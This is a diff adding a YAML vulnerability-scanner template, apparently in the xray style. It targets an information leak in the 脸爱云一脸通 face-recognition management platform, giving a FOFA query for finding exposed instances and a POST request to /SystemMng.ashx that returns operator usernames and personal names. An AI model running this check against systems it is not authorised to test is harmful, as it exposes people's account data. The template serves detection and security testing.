@@ -1,0 +1,18 @@
+id: poc-yaml-lian-ai-yun-seloperators-info-leak
+info:
+  name: 脸爱云一脸通智慧平台 SelOperators 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 一脸通智慧管理平台
+  fofa: title="欢迎使用脸爱云 一脸通智慧管理平台"
+requests:
+- method: POST
+  path: /SystemMng.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: username=admin&funcName=SelOperators
+  expression: status_code == 200 && contains(body,"\"rows\":") && !contains(body,"<")
+    && matches(body,"\"username\\\\\":\\\\\"[a-zA-Z]+\\\\\"") && matches(body,"\"people_name\\\\\":\\\\\"[\u4e00-\u9fa5]+\\\\\"")
+variables: {}
+transport: http
